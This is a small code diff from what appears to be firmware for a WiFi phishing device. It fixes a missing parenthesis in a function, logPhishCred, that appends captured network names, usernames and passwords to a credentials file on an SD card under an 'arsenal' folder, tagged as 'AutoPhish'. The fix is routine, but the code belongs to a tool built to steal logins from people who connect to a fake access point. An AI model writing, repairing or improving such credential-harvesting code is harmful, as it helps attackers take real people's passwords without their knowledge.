@@ -89,7 +89,7 @@ button{width:100%;padding:14px;background:#007AFF;color:#fff;border:none;border-
 
 static void logPhishCred(String ssid, String user, String pass) {
     if (setupSdCard()) {
-        if (!SD.exists("/arsenal") SD.mkdir("/arsenal");
+        if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
         File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
         if (f) {
             f.printf("[%lu] AutoPhish SSID:%s | User:%s | Pass:%s\n",
